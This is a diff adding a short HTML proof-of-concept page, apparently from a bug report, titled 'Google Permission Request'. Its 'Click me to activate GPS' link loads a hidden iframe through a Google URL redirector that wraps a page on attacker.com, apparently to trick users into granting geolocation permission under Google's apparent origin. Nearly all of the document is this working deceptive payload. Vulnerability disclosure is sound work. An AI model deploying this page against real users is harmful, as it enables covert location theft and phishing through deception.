@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Google Permission Request</title>
+</head>
+<body>
+  <a href="#" onclick="poc()">Click me to activate GPS</a>
+
+  <iframe id="ifr" src style="display:none"></iframe>
+
+  <script>
+    function poc() {
+      // Redirect to geolocation-triggering page via Google URL wrapper
+      document.getElementById("ifr").src = "https://www.google.com/url?q=https://attacker.com/fake-geolocation.html&sa=D&source=buganizer&usg=AOvVawXYZ";
+    }
+  </script>
+</body>
+</html>
